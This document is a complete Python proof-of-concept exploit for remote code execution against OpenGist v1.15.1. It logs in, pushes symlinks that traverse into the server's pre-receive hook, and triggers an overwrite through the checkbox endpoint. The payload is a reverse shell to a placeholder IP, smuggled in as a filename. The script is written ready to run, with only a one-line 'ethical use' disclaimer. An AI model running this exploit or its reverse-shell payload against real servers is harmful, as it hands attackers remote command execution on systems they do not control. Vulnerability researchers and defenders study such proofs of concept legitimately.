#!/usr/bin/env python3
# For ethical use only. RCE exploit POC for use against OpenGist v1.15.1
#
from __future__ import annotations

import argparse
import http.cookiejar
import os
import re
import shutil
import subprocess
import sys
import tempfile
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser
from pathlib import Path

EVIL_PAYLOAD = "$(sh -i >& /dev/tcp/YOURIP/4444 0>&1)"


class CsrfParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.token: str | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag.lower() != "input":
            return
        values = dict(attrs)
        if values.get("name") == "_csrf" and values.get("value"):
            self.token = values["value"]


def extract_csrf(page: bytes) -> str:
    parser = CsrfParser()
    parser.feed(page.decode("utf-8", errors="replace"))
    if not parser.token:
        raise RuntimeError("OpenGist page did not contain an _csrf token")
    return parser.token


def run_git(args: list[str], *, cwd: Path | None, env: dict[str, str]) -> None:
    printable = " ".join(args)
    print(f"[+] git: {printable}")
    subprocess.run(args, cwd=cwd, env=env, check=True)


def build_git_environment(temp_root: Path, username: str, password: str) -> dict[str, str]:
    askpass = temp_root / "askpass.sh"
    askpass.write_text(
        "#!/bin/sh\n"
        "case \"$1\" in\n"
        "  *Username*) printf '%s\\n' \"$OG_POC_USERNAME\" ;;\n"
        "  *)          printf '%s\\n' \"$OG_POC_PASSWORD\" ;;\n"
        "esac\n",
        encoding="utf-8",
    )
    askpass.chmod(0o700)

    env = os.environ.copy()
    env.update(
        {
            "GIT_ASKPASS": str(askpass),
            "GIT_ASKPASS_REQUIRE": "force",
            "GIT_TERMINAL_PROMPT": "0",
            "OG_POC_USERNAME": username,
            "OG_POC_PASSWORD": password,
        }
    )
    return env


def login(opener: urllib.request.OpenerDirector, target: str, username: str, password: str) -> None:
    login_url = f"{target}/-/login"
    with opener.open(login_url, timeout=20) as response:
        csrf = extract_csrf(response.read())

    body = urllib.parse.urlencode(
        {"username": username, "password": password, "_csrf": csrf}
    ).encode()
    request = urllib.request.Request(login_url, data=body, method="POST")
    with opener.open(request, timeout=20) as response:
        final_url = response.geturl()
        response.read()

    if urllib.parse.urlparse(final_url).path.endswith("/-/login"):
        raise RuntimeError("login failed; check the username and password")
    print(f"[+] Logged in as {username}")


def trigger_checkbox(
    opener: urllib.request.OpenerDirector,
    target: str,
    username: str,
    gist_uuid: str,
) -> tuple[int, str]:
    quoted_user = urllib.parse.quote(username, safe="")
    gist_url = f"{target}/{quoted_user}/{gist_uuid}"
    with opener.open(gist_url, timeout=20) as response:
        csrf = extract_csrf(response.read())

    body = urllib.parse.urlencode(
        {"_csrf": csrf, "file": "task.md", "checkbox": "0"}
    ).encode()
    request = urllib.request.Request(
        f"{gist_url}/checkbox",
        data=body,
        method="PUT",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )

    try:
        with opener.open(request, timeout=30) as response:
            return response.status, response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8", errors="replace")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "OpenGist v1.15.1 PoC: overwrite the attacker's own "
            "pre-receive hook and run `payload`."
        )
    )
    parser.add_argument("--target", required=True, help="OpenGist base URL, including port")
    parser.add_argument("--username", required=True, help="Ordinary OpenGist username")
    parser.add_argument("--password", required=True, help="Ordinary OpenGist password")
    parser.add_argument(
        "--gist",
        required=True,
        dest="gist_uuid",
        help="Full 32-character UUID of a disposable gist owned by the account",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    target = args.target.rstrip("/")

    if not re.fullmatch(r"[0-9A-Fa-f]{32}", args.gist_uuid):
        print("error: --gist must be the full 32-character UUID", file=sys.stderr)
        return 2
    if shutil.which("git") is None:
        print("error: git is not installed or not in PATH", file=sys.stderr)
        return 2
    if os.name != "posix":
        print("error: run this PoC from Linux, macOS, or WSL with symlink support", file=sys.stderr)
        return 2

    cookie_jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

    try:
        login(opener, target, args.username, args.password)

        with tempfile.TemporaryDirectory(prefix="opengist-id-poc-") as temp_name:
            temp_root = Path(temp_name)
            repo = temp_root / "gist"
            git_env = build_git_environment(temp_root, args.username, args.password)
            quoted_user = urllib.parse.quote(args.username, safe="")
            clone_url = f"{target}/{quoted_user}/{args.gist_uuid}.git"

            run_git(["git", "clone", clone_url, str(repo)], cwd=None, env=git_env)
            run_git(["git", "config", "user.name", args.username], cwd=repo, env=git_env)
            run_git(
                ["git", "config", "user.email", f"{args.username}@example.invalid"],
                cwd=repo,
                env=git_env,
            )

            payload_path = repo / EVIL_PAYLOAD
            task_path = repo / "task.md"
            if payload_path.exists() or payload_path.is_symlink() or task_path.exists() or task_path.is_symlink():
                raise RuntimeError(
                    "the disposable gist already contains a PoC filename or task.md; use a fresh gist"
                )

            payload_path.symlink_to(".git")
            storage_user = args.username.lower()
            task_target = (
                f"{EVIL_PAYLOAD}/../../../../repos/{storage_user}/"
                f"{args.gist_uuid}/hooks/pre-receive"
            )
            task_path.symlink_to(task_target)

            run_git(["git", "add", "--", EVIL_PAYLOAD, "task.md"], cwd=repo, env=git_env)
            run_git(
                ["git", "commit", "-m", "symlink regression test"],
                cwd=repo,
                env=git_env,
            )
            run_git(["git", "push"], cwd=repo, env=git_env)

        print("[+] Symlinks pushed; sending the authenticated checkbox request")
        status, response_body = trigger_checkbox(
            opener, target, args.username, args.gist_uuid
        )
        print(f"[+] Checkbox response status: {status}")
        if response_body.strip():
            print(f"[+] Checkbox response body: {response_body.strip()[:500]}")
        return 0
    except (OSError, RuntimeError, subprocess.CalledProcessError, urllib.error.URLError) as error:
        print(f"error: {error}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
